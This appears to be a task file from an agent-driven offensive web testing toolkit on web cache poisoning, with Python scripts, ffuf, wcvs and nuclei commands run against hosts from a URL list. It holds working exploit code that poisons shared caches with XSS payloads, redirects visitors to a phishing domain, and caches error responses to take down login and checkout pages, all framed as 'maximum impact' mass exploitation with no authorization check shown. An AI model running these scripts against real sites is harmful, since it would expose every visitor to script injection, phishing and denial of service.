@@ -1,0 +1,1005 @@
+================================================================================
+TASK 84 - WEB CACHE POISONING
+================================================================================
+Covers testing_toolkit.txt Phase 12 Step 39
+Poisoning shared caches to serve malicious content to all users
+
+IMPACT: One successful cache poison = persistent XSS affecting ALL users
+This is a mass-exploitation technique - single attack, thousands of victims.
+
+================================================================================
+INPUTS
+================================================================================
+outputs/live_base_urls.txt                 <- Live hosts
+outputs/http2/h2_supported.txt             <- HTTP/2 hosts (different caching)
+temp/agent1/waf_results.txt                <- WAF info (affects bypass)
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/cache/
+    cache_behavior_map.txt                 <- How each host caches
+    unkeyed_headers.txt                    <- Headers not in cache key
+    unkeyed_params.txt                     <- Params not in cache key
+    poisoning_confirmed.txt                <- CONFIRMED poisonable targets
+    exploitation_payloads.txt              <- Working payloads
+
+outputs/vulnerabilities/CACHE-POISON-*-CRITICAL.md
+
+================================================================================
+🧠 AGENT DECISION FRAMEWORK
+================================================================================
+
+STOP. Think like an attacker who wants MAXIMUM IMPACT.
+
+    What's your goal?
+    |
+    +-- Mass XSS (poison JS/HTML responses)
+    |   +-- Target: Static resources, landing pages
+    |   +-- Impact: Every user gets XSS
+    |   +-- Persistence: Until cache expires (hours/days)
+    |
+    +-- Targeted Poisoning (specific user/path)
+    |   +-- Target: User-specific pages with cache bugs
+    |   +-- Impact: Selected victims
+    |   +-- Technique: Cache key manipulation
+    |
+    +-- DoS via Cache (poison with errors)
+        +-- Target: Critical pages (login, checkout)
+        +-- Impact: Site unusable for all users
+        +-- Technique: Poison with 500/404 responses
+
+    How do caches work? (KNOW YOUR ENEMY)
+    |
+    +-- Cache KEY = What makes a request "unique"
+    |   Usually: Host + Path + Query params
+    |   Problem: Many headers/params NOT in key
+    |
+    +-- UNKEYED INPUT = Your weapon
+    |   Header/param that:
+    |   1. Affects response content
+    |   2. NOT included in cache key
+    |   = Same cache entry, different content
+    |
+    +-- Example attack flow:
+        1. Find: X-Forwarded-Host reflects in page
+        2. Verify: X-Forwarded-Host NOT in cache key
+        3. Poison: Send X-Forwarded-Host: evil.com
+        4. Result: All users get response with evil.com
+
+    What cache is in front?
+    |
+    +-- CDN (Cloudflare, Akamai, Fastly)
+    |   +-- Massive reach - poison = global impact
+    |   +-- Usually ignore: X-Forwarded-*, custom headers
+    |   +-- Check: CF-Cache-Status, X-Cache headers
+    |
+    +-- Reverse Proxy (Varnish, Nginx, Apache)
+    |   +-- Application-specific caching
+    |   +-- Check: Via, X-Varnish, X-Cache-Status
+    |
+    +-- Application Cache (Rails, Django, etc.)
+        +-- Framework-level caching
+        +-- Often misses edge cases
+
+================================================================================
+PHASE 1: CACHE FINGERPRINTING
+================================================================================
+
+OBJECTIVE: Understand EXACTLY how target caches work before attacking.
+
+-----------------------------------------
+1.1 Identify Cache Presence
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+cache_fingerprint.py - Identify and fingerprint caching systems
+Real hackers RECON before attack.
+"""
+
+import requests
+import time
+import hashlib
+import os
+
+requests.packages.urllib3.disable_warnings()
+
+class CacheFingerprinter:
+    
+    # Cache indicator headers (response)
+    CACHE_INDICATORS = [
+        'X-Cache',           # HIT/MISS
+        'X-Cache-Status',    # Nginx
+        'CF-Cache-Status',   # Cloudflare
+        'X-Varnish',         # Varnish (two IDs = HIT)
+        'Age',               # How long cached
+        'X-Served-By',       # CDN node
+        'X-Cache-Hits',      # Hit count
+        'Via',               # Proxy chain
+        'X-Proxy-Cache',     # Generic
+        'X-Drupal-Cache',    # Drupal
+        'X-Cache-Lookup',    # Some CDNs
+        'Fastly-Debug-Digest', # Fastly
+        'X-Rack-Cache',      # Ruby/Rack
+    ]
+    
+    def __init__(self, url):
+        self.url = url
+        self.session = requests.Session()
+        self.cache_info = {
+            'has_cache': False,
+            'cache_type': 'unknown',
+            'cache_headers': {},
+            'cache_ttl': None,
+            'cache_key_components': []
+        }
+    
+    def check_cache_headers(self):
+        """First pass - what cache headers exist?"""
+        
+        resp = self.session.get(self.url, verify=False, timeout=10)
+        
+        for header in self.CACHE_INDICATORS:
+            if header.lower() in [h.lower() for h in resp.headers]:
+                value = resp.headers.get(header)
+                self.cache_info['cache_headers'][header] = value
+                self.cache_info['has_cache'] = True
+                
+                # Identify cache type
+                if 'cloudflare' in str(value).lower() or header == 'CF-Cache-Status':
+                    self.cache_info['cache_type'] = 'Cloudflare'
+                elif 'varnish' in header.lower() or 'varnish' in str(value).lower():
+                    self.cache_info['cache_type'] = 'Varnish'
+                elif 'fastly' in header.lower():
+                    self.cache_info['cache_type'] = 'Fastly'
+                elif 'akamai' in str(value).lower():
+                    self.cache_info['cache_type'] = 'Akamai'
+        
+        # Check Age header for TTL hint
+        if 'Age' in resp.headers:
+            self.cache_info['cache_ttl'] = int(resp.headers['Age'])
+        
+        # Check Cache-Control
+        if 'Cache-Control' in resp.headers:
+            cc = resp.headers['Cache-Control']
+            self.cache_info['cache_control'] = cc
+            if 'max-age=' in cc:
+                self.cache_info['max_age'] = int(cc.split('max-age=')[1].split(',')[0])
+        
+        return self.cache_info
+    
+    def test_cache_hit(self):
+        """Confirm caching by requesting twice"""
+        
+        # Add cache buster to get fresh copy
+        buster = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
+        test_url = f"{self.url}?cb={buster}"
+        
+        # First request - should be MISS
+        resp1 = self.session.get(test_url, verify=False, timeout=10)
+        cache1 = self._get_cache_status(resp1)
+        
+        time.sleep(0.5)
+        
+        # Second request - should be HIT
+        resp2 = self.session.get(test_url, verify=False, timeout=10)
+        cache2 = self._get_cache_status(resp2)
+        
+        if cache1 == 'MISS' and cache2 == 'HIT':
+            self.cache_info['confirmed_caching'] = True
+            return True
+        
+        # Check if Age increased
+        age1 = int(resp1.headers.get('Age', 0))
+        age2 = int(resp2.headers.get('Age', 0))
+        if age2 > age1:
+            self.cache_info['confirmed_caching'] = True
+            return True
+        
+        return False
+    
+    def _get_cache_status(self, resp):
+        """Extract cache hit/miss status"""
+        for header in ['X-Cache', 'X-Cache-Status', 'CF-Cache-Status']:
+            if header in resp.headers:
+                val = resp.headers[header].upper()
+                if 'HIT' in val:
+                    return 'HIT'
+                if 'MISS' in val:
+                    return 'MISS'
+        return 'UNKNOWN'
+    
+    def fingerprint(self):
+        """Full fingerprint"""
+        print(f"[*] Fingerprinting cache: {self.url}")
+        
+        self.check_cache_headers()
+        self.test_cache_hit()
+        
+        return self.cache_info
+
+# Scan all targets
+os.makedirs('outputs/cache', exist_ok=True)
+
+results = []
+
+with open('outputs/live_base_urls.txt') as f:
+    for line in f:
+        url = line.strip()
+        if not url:
+            continue
+        
+        try:
+            fp = CacheFingerprinter(url)
+            info = fp.fingerprint()
+            
+            if info['has_cache']:
+                print(f"[+] CACHE FOUND: {url}")
+                print(f"    Type: {info['cache_type']}")
+                print(f"    Headers: {list(info['cache_headers'].keys())}")
+                results.append(f"{url}|{info['cache_type']}|{info.get('confirmed_caching', False)}")
+        except Exception as e:
+            print(f"[-] Error on {url}: {e}")
+
+with open('outputs/cache/cache_behavior_map.txt', 'w') as f:
+    f.write("# URL | Cache Type | Confirmed\n")
+    for r in results:
+        f.write(f"{r}\n")
+
+print(f"\n[*] Found {len(results)} hosts with caching")
+
+================================================================================
+PHASE 2: UNKEYED INPUT DISCOVERY
+================================================================================
+
+This is the CORE of cache poisoning - find inputs that:
+1. Affect response content
+2. Are NOT part of cache key
+
+-----------------------------------------
+2.1 Header-Based Unkeyed Inputs
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+unkeyed_header_scan.py - Find headers that affect response but not cache key
+
+TECHNIQUE:
+1. Send request with suspicious header + cache buster
+2. If header value appears in response, it's REFLECTED
+3. Send same cache buster WITHOUT header
+4. If header value still in cached response = UNKEYED (VULNERABLE)
+"""
+
+import requests
+import hashlib
+import time
+import random
+import string
+
+requests.packages.urllib3.disable_warnings()
+
+# Headers commonly unkeyed (your attack surface)
+HEADERS_TO_TEST = [
+    # Forwarding headers
+    ('X-Forwarded-Host', '{CANARY}.evil.com'),
+    ('X-Forwarded-Scheme', 'javascript'),
+    ('X-Forwarded-Proto', 'https'),
+    ('X-Forwarded-Port', '1337'),
+    ('X-Forwarded-For', '127.0.0.1'),
+    ('X-Original-URL', '/admin'),
+    ('X-Rewrite-URL', '/{CANARY}'),
+    
+    # Host variations
+    ('X-Host', '{CANARY}.evil.com'),
+    ('X-HTTP-Host-Override', '{CANARY}.evil.com'),
+    ('Forwarded', 'host={CANARY}.evil.com'),
+    
+    # Framework-specific
+    ('X-Original-Host', '{CANARY}.evil.com'),
+    ('X-Forwarded-Server', '{CANARY}.evil.com'),
+    ('X-Proxy-Host', '{CANARY}.evil.com'),
+    
+    # Custom/Debug
+    ('X-Custom-IP-Authorization', '127.0.0.1'),
+    ('X-Debug', '1'),
+    ('X-Requested-With', '{CANARY}'),
+    ('Origin', 'https://{CANARY}.evil.com'),
+    
+    # CDN/WAF bypass
+    ('True-Client-IP', '127.0.0.1'),
+    ('CF-Connecting-IP', '127.0.0.1'),
+    ('X-Real-IP', '127.0.0.1'),
+    ('X-Client-IP', '127.0.0.1'),
+]
+
+def generate_canary():
+    """Generate unique canary to detect reflection"""
+    return 'CACHETEST' + ''.join(random.choices(string.ascii_lowercase, k=8))
+
+def test_unkeyed_header(url, header_name, header_template):
+    """Test if header is unkeyed and reflected"""
+    
+    canary = generate_canary()
+    header_value = header_template.replace('{CANARY}', canary)
+    cache_buster = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:10]
+    
+    test_url = f"{url}?cb={cache_buster}"
+    
+    # Step 1: Send request WITH header (should cache)
+    resp1 = requests.get(
+        test_url,
+        headers={header_name: header_value},
+        verify=False,
+        timeout=10
+    )
+    
+    # Check if canary reflected
+    if canary not in resp1.text:
+        return None  # Header not reflected, skip
+    
+    time.sleep(0.5)
+    
+    # Step 2: Send request WITHOUT header (same cache buster)
+    resp2 = requests.get(
+        test_url,
+        verify=False,
+        timeout=10
+    )
+    
+    # If canary STILL in response, header is UNKEYED = VULNERABLE
+    if canary in resp2.text:
+        return {
+            'header': header_name,
+            'value': header_value,
+            'reflected_in': 'cached response',
+            'url': test_url,
+            'severity': 'HIGH'
+        }
+    
+    return None
+
+# Main scan
+unkeyed_found = []
+
+print("[*] Scanning for unkeyed headers (cache poison vectors)...")
+print("[*] This is your attack surface - headers that poison the cache\n")
+
+with open('outputs/cache/cache_behavior_map.txt') as f:
+    for line in f:
+        if line.startswith('#'):
+            continue
+        parts = line.strip().split('|')
+        if len(parts) < 1:
+            continue
+        
+        url = parts[0]
+        print(f"\n[*] Testing: {url}")
+        
+        for header_name, header_template in HEADERS_TO_TEST:
+            try:
+                result = test_unkeyed_header(url, header_name, header_template)
+                if result:
+                    print(f"[CRITICAL] UNKEYED HEADER: {header_name}")
+                    print(f"           Payload: {result['value']}")
+                    unkeyed_found.append(result)
+            except Exception as e:
+                pass
+
+# Save results
+with open('outputs/cache/unkeyed_headers.txt', 'w') as f:
+    f.write("# UNKEYED HEADERS - CACHE POISON VECTORS\n")
+    f.write("# These headers affect response but NOT cache key\n\n")
+    for item in unkeyed_found:
+        f.write(f"URL: {item['url']}\n")
+        f.write(f"Header: {item['header']}\n")
+        f.write(f"Payload: {item['value']}\n")
+        f.write(f"---\n")
+
+print(f"\n[*] Found {len(unkeyed_found)} unkeyed headers!")
+
+-----------------------------------------
+2.2 Parameter-Based Unkeyed Inputs
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+unkeyed_param_scan.py - Find query params not in cache key
+
+Some caches only key on PATH, ignoring certain params.
+Find params that reflect but don't affect caching.
+"""
+
+import requests
+import random
+import string
+import hashlib
+import time
+
+requests.packages.urllib3.disable_warnings()
+
+# Params often excluded from cache key
+PARAMS_TO_TEST = [
+    'utm_source',
+    'utm_medium', 
+    'utm_campaign',
+    'utm_content',
+    'utm_term',
+    'fbclid',
+    'gclid',
+    'msclkid',
+    'ref',
+    'source',
+    'callback',
+    'jsonp',
+    '_',
+    'timestamp',
+    'bust',
+    'nocache',
+    'v',
+    'ver',
+    'version',
+]
+
+def generate_canary():
+    return 'PARAMTEST' + ''.join(random.choices(string.ascii_lowercase, k=8))
+
+def test_unkeyed_param(url, param):
+    """Test if param is unkeyed"""
+    
+    canary = generate_canary()
+    base_buster = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
+    
+    # URL with param (should cache)
+    test_url1 = f"{url}?cachebust={base_buster}&{param}={canary}"
+    
+    resp1 = requests.get(test_url1, verify=False, timeout=10)
+    
+    if canary not in resp1.text:
+        return None  # Param not reflected
+    
+    time.sleep(0.5)
+    
+    # URL without param but same cache buster
+    test_url2 = f"{url}?cachebust={base_buster}"
+    
+    resp2 = requests.get(test_url2, verify=False, timeout=10)
+    
+    # If canary in cached response, param is unkeyed
+    if canary in resp2.text:
+        return {
+            'param': param,
+            'url': url,
+            'evidence': 'reflected in cached response without param'
+        }
+    
+    return None
+
+# Scan
+unkeyed_params = []
+
+with open('outputs/cache/cache_behavior_map.txt') as f:
+    for line in f:
+        if line.startswith('#'):
+            continue
+        url = line.strip().split('|')[0]
+        
+        print(f"[*] Testing params on: {url}")
+        
+        for param in PARAMS_TO_TEST:
+            result = test_unkeyed_param(url, param)
+            if result:
+                print(f"[+] UNKEYED PARAM: {param}")
+                unkeyed_params.append(result)
+
+with open('outputs/cache/unkeyed_params.txt', 'w') as f:
+    for item in unkeyed_params:
+        f.write(f"{item['url']}|{item['param']}\n")
+
+================================================================================
+PHASE 3: WEB CACHE VULNERABILITY SCANNER
+================================================================================
+
+-----------------------------------------
+3.1 Automated Scanner (wcvs)
+-----------------------------------------
+# Web-Cache-Vulnerability-Scanner - comprehensive automated tool
+
+# Install
+pip install wcvs
+# OR
+git clone https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
+cd Web-Cache-Vulnerability-Scanner
+pip install -r requirements.txt
+
+# Run against targets
+wcvs -u https://TARGET.com/ -o outputs/cache/wcvs_results.json
+
+# Full scan with all techniques
+wcvs -u https://TARGET.com/ \
+    --all-techniques \
+    --detect-headers \
+    --follow-redirects \
+    -o outputs/cache/wcvs_full.json
+
+# Scan multiple URLs
+wcvs -l outputs/live_base_urls.txt \
+    -o outputs/cache/wcvs_batch.json \
+    --threads 5
+
+-----------------------------------------
+3.2 Param Miner (Burp Extension Alternative)
+-----------------------------------------
+# Use param-miner wordlist for manual testing
+# https://github.com/PortSwigger/param-miner
+
+# Manual header fuzzing with ffuf
+ffuf -w wordlists/headers.txt:HEADER \
+     -w wordlists/values.txt:VALUE \
+     -u "https://TARGET.com/?cb=FUZZ" \
+     -H "HEADER: VALUE" \
+     -mc all \
+     -o outputs/cache/ffuf_headers.json
+
+================================================================================
+PHASE 4: EXPLOITATION
+================================================================================
+
+Now the fun part - WEAPONIZE what you found.
+
+-----------------------------------------
+4.1 Cache Poisoning for XSS
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+cache_poison_xss.py - Poison cache with XSS payload
+
+SCENARIO: X-Forwarded-Host reflected in page, unkeyed
+RESULT: Every visitor gets XSS
+"""
+
+import requests
+import hashlib
+import time
+
+requests.packages.urllib3.disable_warnings()
+
+def poison_with_xss(url, header, xss_payload):
+    """Attempt to poison cache with XSS"""
+    
+    print(f"[*] Attempting cache poison XSS on: {url}")
+    print(f"[*] Using header: {header}")
+    print(f"[*] Payload: {xss_payload}")
+    
+    # Cache buster to target specific entry
+    cb = hashlib.md5(str(time.time()).encode()).hexdigest()[:6]
+    target_url = f"{url}?v={cb}"
+    
+    # Send poisoning request
+    resp = requests.get(
+        target_url,
+        headers={header: xss_payload},
+        verify=False,
+        timeout=10
+    )
+    
+    if xss_payload in resp.text:
+        print(f"[+] Payload reflected in response!")
+        
+        # Verify cache is poisoned
+        time.sleep(1)
+        
+        resp2 = requests.get(target_url, verify=False, timeout=10)
+        
+        if xss_payload in resp2.text:
+            print(f"[CRITICAL] CACHE POISONED WITH XSS!")
+            print(f"[CRITICAL] All visitors to {target_url} will get XSS")
+            return True
+    
+    return False
+
+# XSS payloads for different reflection contexts
+XSS_PAYLOADS = {
+    'href': '"><script>alert(document.domain)</script>',
+    'src': '" onload="alert(document.domain)"',
+    'host': '"></script><script>alert(document.domain)</script>',
+    'basic': '<script>alert(document.domain)</script>',
+}
+
+# Exploit found unkeyed headers
+with open('outputs/cache/unkeyed_headers.txt') as f:
+    content = f.read()
+    
+# Parse and exploit each finding
+# ... process findings and attempt exploitation
+
+-----------------------------------------
+4.2 Cache Poisoning for Redirect (Open Redirect)
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+cache_poison_redirect.py - Poison cache with redirect to phishing
+
+SCENARIO: X-Forwarded-Host used in redirects
+RESULT: Users redirected to phishing site
+"""
+
+import requests
+
+def poison_redirect(url, header, attacker_domain):
+    """Poison cache to redirect users"""
+    
+    # Find redirect endpoint
+    redirect_endpoints = [
+        '/login',
+        '/logout',
+        '/redirect',
+        '/go',
+        '/url',
+        '/return',
+    ]
+    
+    for endpoint in redirect_endpoints:
+        target = f"{url}{endpoint}"
+        
+        resp = requests.get(
+            target,
+            headers={header: attacker_domain},
+            allow_redirects=False,
+            verify=False,
+            timeout=10
+        )
+        
+        # Check if redirect to attacker
+        location = resp.headers.get('Location', '')
+        if attacker_domain in location:
+            print(f"[CRITICAL] Redirect poisoned!")
+            print(f"[CRITICAL] Users will be redirected to: {location}")
+            return target
+    
+    return None
+
+# Test
+poison_redirect(
+    'https://TARGET.com',
+    'X-Forwarded-Host',
+    'phishing.attacker.com'
+)
+
+-----------------------------------------
+4.3 Cache Poisoning DoS
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+cache_poison_dos.py - Poison cache with error responses
+
+Make critical pages return errors for ALL users
+"""
+
+import requests
+
+def poison_dos(url, technique):
+    """Poison cache with error response"""
+    
+    techniques = {
+        # Oversized header causes 400
+        'large_header': {
+            'X-Oversized': 'A' * 65000
+        },
+        # Invalid host causes 400/502
+        'invalid_host': {
+            'Host': 'invalid..host',
+            'X-Forwarded-Host': 'invalid..host'
+        },
+        # Override to non-existent backend
+        'bad_backend': {
+            'X-Forwarded-Host': '127.0.0.1:1',
+        },
+    }
+    
+    headers = techniques.get(technique, {})
+    
+    resp = requests.get(url, headers=headers, verify=False, timeout=10)
+    
+    if resp.status_code >= 400:
+        print(f"[+] Got error: {resp.status_code}")
+        
+        # Verify error is cached
+        resp2 = requests.get(url, verify=False, timeout=10)
+        if resp2.status_code >= 400:
+            print(f"[CRITICAL] Error response CACHED!")
+            print(f"[CRITICAL] All users get {resp2.status_code} on {url}")
+            return True
+    
+    return False
+
+================================================================================
+PHASE 5: NUCLEI CACHE TEMPLATES
+================================================================================
+
+# Use nuclei with cache-specific templates
+nuclei -l outputs/live_base_urls.txt \
+       -t nuclei-templates/http/cves/ \
+       -t nuclei-templates/http/vulnerabilities/cache-poisoning/ \
+       -o outputs/cache/nuclei_cache.txt
+
+# Custom cache poison template
+cat > temp/agent1/cache-poison-detect.yaml << 'EOF'
+id: cache-poison-detect
+info:
+  name: Cache Poisoning Detection
+  author: agent1
+  severity: high
+  
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cachebust={{randstr}}"
+    headers:
+      X-Forwarded-Host: "{{interactsh-url}}"
+      X-Forwarded-Scheme: "javascript"
+      X-Original-URL: "/admin"
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "{{interactsh-url}}"
+      - type: regex
+        regex:
+          - "javascript.*://"
+          - "interactsh"
+EOF
+
+nuclei -l outputs/live_base_urls.txt \
+       -t temp/agent1/cache-poison-detect.yaml \
+       -o outputs/cache/nuclei_custom.txt
+
+================================================================================
+PHASE 6: FULL AUTOMATION
+================================================================================
+
+#!/usr/bin/env python3
+"""
+cache_poison_full.py - Complete cache poisoning assessment
+"""
+
+import os
+import json
+import requests
+import hashlib
+import time
+import random
+import string
+
+requests.packages.urllib3.disable_warnings()
+
+class CachePoisonScanner:
+    
+    def __init__(self):
+        self.results = {
+            'cached_hosts': [],
+            'unkeyed_inputs': [],
+            'confirmed_poisoning': [],
+            'exploitation': []
+        }
+        os.makedirs('outputs/cache', exist_ok=True)
+        os.makedirs('outputs/vulnerabilities', exist_ok=True)
+    
+    def fingerprint_cache(self, url):
+        """Identify cache presence and type"""
+        try:
+            resp = requests.get(url, verify=False, timeout=10)
+            
+            cache_headers = {}
+            for h in ['X-Cache', 'CF-Cache-Status', 'Age', 'X-Varnish', 'Via']:
+                if h in resp.headers:
+                    cache_headers[h] = resp.headers[h]
+            
+            if cache_headers:
+                return {'url': url, 'headers': cache_headers, 'has_cache': True}
+        except:
+            pass
+        return {'url': url, 'has_cache': False}
+    
+    def find_unkeyed_headers(self, url):
+        """Find headers not in cache key"""
+        
+        headers_to_test = [
+            ('X-Forwarded-Host', 'CANARY.evil.com'),
+            ('X-Forwarded-Scheme', 'javascript'),
+            ('X-Original-URL', '/CANARY'),
+            ('X-Host', 'CANARY.evil.com'),
+            ('Origin', 'https://CANARY.evil.com'),
+        ]
+        
+        unkeyed = []
+        
+        for header, template in headers_to_test:
+            canary = 'TEST' + ''.join(random.choices(string.ascii_lowercase, k=6))
+            value = template.replace('CANARY', canary)
+            cb = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:8]
+            
+            test_url = f"{url}?cb={cb}"
+            
+            try:
+                # Request with header
+                resp1 = requests.get(test_url, headers={header: value}, verify=False, timeout=10)
+                
+                if canary not in resp1.text:
+                    continue
+                
+                time.sleep(0.5)
+                
+                # Request without header
+                resp2 = requests.get(test_url, verify=False, timeout=10)
+                
+                if canary in resp2.text:
+                    unkeyed.append({
+                        'url': url,
+                        'header': header,
+                        'template': template,
+                        'evidence': 'canary in cached response'
+                    })
+            except:
+                pass
+        
+        return unkeyed
+    
+    def attempt_poison(self, url, header, payload):
+        """Attempt actual cache poisoning"""
+        
+        cb = hashlib.md5(str(time.time()).encode()).hexdigest()[:6]
+        target = f"{url}?poison={cb}"
+        
+        try:
+            # Poison
+            resp1 = requests.get(target, headers={header: payload}, verify=False, timeout=10)
+            
+            if payload not in resp1.text:
+                return False
+            
+            time.sleep(1)
+            
+            # Verify
+            resp2 = requests.get(target, verify=False, timeout=10)
+            
+            if payload in resp2.text:
+                return {
+                    'url': target,
+                    'header': header,
+                    'payload': payload,
+                    'confirmed': True
+                }
+        except:
+            pass
+        
+        return False
+    
+    def generate_report(self, finding):
+        """Generate vulnerability report"""
+        
+        vuln_id = hashlib.md5(finding['url'].encode()).hexdigest()[:8]
+        
+        report = f"""# Cache Poisoning Vulnerability
+
+**Severity**: CRITICAL
+**URL**: {finding['url']}
+**Header**: {finding['header']}
+
+## Description
+The application is vulnerable to web cache poisoning. An attacker can inject 
+malicious content into the cache, causing all users to receive the poisoned response.
+
+## Proof of Concept
+```
+GET {finding['url']} HTTP/1.1
+Host: target.com
+{finding['header']}: {finding['payload']}
+```
+
+## Impact
+- Stored XSS affecting all users
+- Phishing via cache redirect
+- DoS by caching error responses
+
+## Remediation
+1. Include all user-controllable headers in cache key
+2. Remove reflection of host-related headers
+3. Implement cache validation
+"""
+        
+        with open(f"outputs/vulnerabilities/CACHE-POISON-{vuln_id}-CRITICAL.md", 'w') as f:
+            f.write(report)
+    
+    def scan(self, urls_file):
+        """Full scan"""
+        
+        with open(urls_file) as f:
+            urls = [l.strip() for l in f if l.strip()]
+        
+        print(f"[*] Scanning {len(urls)} URLs for cache poisoning...")
+        
+        for url in urls:
+            print(f"\n[*] Target: {url}")
+            
+            # Step 1: Fingerprint
+            cache_info = self.fingerprint_cache(url)
+            if cache_info['has_cache']:
+                print(f"[+] Cache detected")
+                self.results['cached_hosts'].append(cache_info)
+            else:
+                print(f"[-] No cache detected")
+                continue
+            
+            # Step 2: Find unkeyed inputs
+            unkeyed = self.find_unkeyed_headers(url)
+            if unkeyed:
+                print(f"[+] Found {len(unkeyed)} unkeyed headers!")
+                self.results['unkeyed_inputs'].extend(unkeyed)
+                
+                # Step 3: Attempt exploitation
+                for finding in unkeyed:
+                    xss = '<script>alert(document.domain)</script>'
+                    result = self.attempt_poison(url, finding['header'], xss)
+                    
+                    if result:
+                        print(f"[CRITICAL] CACHE POISONED: {url}")
+                        self.results['confirmed_poisoning'].append(result)
+                        self.generate_report(result)
+        
+        return self.results
+    
+    def save(self):
+        """Save all results"""
+        
+        with open('outputs/cache/scan_results.json', 'w') as f:
+            json.dump(self.results, f, indent=2)
+        
+        with open('outputs/cache/poisoning_confirmed.txt', 'w') as f:
+            for p in self.results['confirmed_poisoning']:
+                f.write(f"{p['url']}|{p['header']}|{p['payload']}\n")
+
+# Run
+if __name__ == "__main__":
+    scanner = CachePoisonScanner()
+    scanner.scan('outputs/live_base_urls.txt')
+    scanner.save()
+    
+    print(f"\n{'='*60}")
+    print(f"[*] Cached hosts: {len(scanner.results['cached_hosts'])}")
+    print(f"[*] Unkeyed inputs: {len(scanner.results['unkeyed_inputs'])}")
+    print(f"[*] CONFIRMED POISONING: {len(scanner.results['confirmed_poisoning'])}")
+
+================================================================================
+SUMMARY CHECKLIST
+================================================================================
+
+[ ] Cache fingerprinting complete (type, TTL, headers)
+[ ] Unkeyed headers discovered
+[ ] Unkeyed parameters discovered  
+[ ] wcvs automated scan run
+[ ] Nuclei cache templates run
+[ ] Exploitation attempted on findings
+[ ] Vulnerability reports generated
+
+================================================================================
+TOOLS REFERENCE
+================================================================================
+
+PRIMARY:
+- Web-Cache-Vulnerability-Scanner (wcvs) - Automated scanning
+- Custom Python scripts - Targeted testing
+- Nuclei - Template-based detection
+
+TECHNIQUES:
+1. Unkeyed Header Injection (X-Forwarded-Host, etc.)
+2. Unkeyed Parameter Injection (utm_*, tracking params)
+3. Cache Key Normalization (path casing, encoding)
+4. Fat GET Requests (body in GET cached as param)
+
+SEVERITY: CRITICAL
+Single poison = ALL users affected for cache TTL duration
+
+================================================================================
+NEXT TASK
+================================================================================
+Task 85: Cache Deception (steal cached user data)
